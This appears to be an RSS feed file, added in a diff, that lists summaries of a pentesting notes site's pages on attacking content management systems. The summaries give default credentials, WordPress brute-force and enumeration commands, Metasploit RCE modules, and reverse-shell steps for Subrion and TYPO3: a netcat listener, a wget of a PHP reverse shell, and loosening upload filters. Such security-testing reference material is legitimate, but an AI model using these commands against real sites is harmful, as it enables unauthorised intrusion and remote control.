@@ -1,0 +1,75 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Cms on D0CUM3NTN4T10N</title>
+    <link>https://documentnation.github.io/docs/hdks/web/cms/</link>
+    <description>Recent content in Cms on D0CUM3NTN4T10N</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Wed, 17 Jan 2024 11:55:13 +0530</lastBuildDate>
+    <atom:link href="https://documentnation.github.io/docs/hdks/web/cms/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Joomla CMS Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/cms/joomla-cms-pentesting/</link>
+      <pubDate>Sat, 23 Dec 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/cms/joomla-cms-pentesting/</guid>
+      <description>Scan link joomscan -u https://example.com Common Directories link /administrator/ /administrator/manifests/files/joomla.xml /cache/ /components/ /configuration.php /htaccess.txt /includes/ /index.php /joomla.xml /language/en-GB/en-GB.xml /libraries/ /LICENSE.txt /logs/ /media/ /modules/ /plugins/ /README.txt /templates/ /tmp/ Default Credentials linkThe default username is &amp;ldquo;admin&amp;rdquo; and no password.</description>
+    </item>
+    <item>
+      <title>WordPress Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/cms/wordpress-pentesting/</link>
+      <pubDate>Wed, 06 Dec 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/cms/wordpress-pentesting/</guid>
+      <description>Enumeration link nmap --script http-wordpress-brute nmap --script http-wordpress-enum --script-args type=&amp;#34;plugins&amp;#34;,search-limit=1500 -p 80 &amp;lt;target-ip&amp;gt; nmap --script http-wordpress-users -p 80 &amp;lt;target-ip&amp;gt; nmap --script http-wordpress-* -p 80 &amp;lt;target-ip&amp;gt; WpScan linkWpscan is a WordPress security scanner which can brute force credentials.&#xA;wpscan --url http://&amp;lt;target-ip&amp;gt; -P wordlist.txt # --rua: random user agent # --http-auth username:password # -e: enumerate # ap: All plugins # at: All themes # tt: Timthumbs # cb: Config backups # dbe: Db exports # u: User IDs range # m: Media IDs range wpscan --rua -e ap,at,tt,cb,dbe,u,m --url https://vulnerable.</description>
+    </item>
+    <item>
+      <title>Mara CMS Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/cms/mara-cms-pentesting/</link>
+      <pubDate>Tue, 07 Mar 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/cms/mara-cms-pentesting/</guid>
+      <description>Default Credentials link admin:changeme Remote Code Execution (RCE) v7.5 linkReference: https://www.exploit-db.com/exploits/48780&#xA;Automation link msfconsole msf&amp;gt; use exploit/multi/http/maracms_upload_exec msf&amp;gt; set rhosts &amp;lt;target-ip&amp;gt; msf&amp;gt; set lhost &amp;lt;local-ip&amp;gt; msf&amp;gt; set srvhost &amp;lt;local-ip&amp;gt; msf&amp;gt; set srvport &amp;lt;local-port&amp;gt; msf&amp;gt; set targeturi /path/to/maracms/ msf&amp;gt; set targeturipath /path/to/maracms/ </description>
+    </item>
+    <item>
+      <title>FUEL CMS Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/cms/fuel-cms-pentesting/</link>
+      <pubDate>Mon, 20 Feb 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/cms/fuel-cms-pentesting/</guid>
+      <description>Default Credential link admin:admin </description>
+    </item>
+    <item>
+      <title>Subrion CMS Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/cms/subrion-cms-pentesting/</link>
+      <pubDate>Mon, 20 Feb 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/cms/subrion-cms-pentesting/</guid>
+      <description>File Upload to Reverse Shell (Credential Required) link1. Download Reverse Shell Payload linkGet the PHP payload from php-reverse-shell. And change the file extension to &amp;rsquo;.phar&amp;rsquo;.&#xA;Then start a listener.&#xA;nc -lvnp 4444 2. Upload the Payload in Subrion Panel link Login&#xA;Move to Content -&amp;gt; Uploads in Panel&#xA;Upload reverse-shell.phar&#xA;Access to /subrion/upload/reverse-shell.phar&#xA;Now you get a shell.</description>
+    </item>
+    <item>
+      <title>Cockpit CMS Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/cms/cockpit-cms-pentesting/</link>
+      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/cms/cockpit-cms-pentesting/</guid>
+      <description>Enumeration &amp;amp; Remote Code Execution (RCE) &amp;amp; Reverse Shell link # Reset password (CVE-2020-35847) msf&amp;gt; use exploit/multi/cockpit_cms_rce msf&amp;gt; set USER admin msf&amp;gt; run Version Detection linkCockpit CMS version is displayed as the value of “data-version” attribute in html tag.&#xA;&amp;lt;html lang=&amp;#34;en&amp;#34; data-base=&amp;#34;/&amp;#34; data-route=&amp;#34;/&amp;#34; data-version=&amp;#34;0.11.1&amp;#34; data-locale=&amp;#34;en&amp;#34;&amp;gt; Common Directories link /auth/check # We can enumerate users using the path /auth/forgotpassword /auth/index /auth/login /auth/requestreset # We can enumerate users using the path </description>
+    </item>
+    <item>
+      <title>Concrete CMS Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/cms/concrete-cms-pentesting/</link>
+      <pubDate>Sun, 05 Feb 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/cms/concrete-cms-pentesting/</guid>
+      <description>Default Credentials linkThe default username is “admin” in Concrete5.</description>
+    </item>
+    <item>
+      <title>TYPO3 Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/cms/typo3-pentesting/</link>
+      <pubDate>Thu, 01 Dec 2022 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/cms/typo3-pentesting/</guid>
+      <description>Directory Discovery link /fileadmin/ /typo3/ /typo3conf/ /typo3temp/ Default Credentials link admin:&amp;lt;password-specified-when-installed&amp;gt; Reverse Shell (Admin Credential Required) linkFirst, to check and edit the configuration of the uploaded file extension, go to “ADMIN TOOLS” → “Configure Installation-Wide Options” → “Backend” → “fileDenyPattern”.&#xA;Update the configuration if necessary. For example, remove “php[1-9]?”&#xA;\.(phpsh|phtml|pht|phar|shtml|cgi)(\..*)?$|\.pl$|^\.htaccess$ Next, prepare the payload for reverse shell named “shell.php”.&#xA;wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php Go to “FILE” → “Filelist” and upload the payload to the root of /fileadmin.</description>
+    </item>
+    <item>
+      <title>Bolt CMS Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/cms/bolt-cms-pentesting/</link>
+      <pubDate>Tue, 22 Nov 2022 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/cms/bolt-cms-pentesting/</guid>
+      <description>Login Page link /bolt Remote Code Execution (v3.7.1) link msfconsole msf&amp;gt; use exploit/unix/webapp/bolt_authenticated_rce msf&amp;gt; set lhost &amp;lt;local-ip&amp;gt; msf&amp;gt; set rhosts &amp;lt;target-ip&amp;gt; msf&amp;gt; set username &amp;lt;username&amp;gt; msf&amp;gt; set password &amp;lt;password&amp;gt; msf&amp;gt; run </description>
+    </item>
+  </channel>
+</rss>
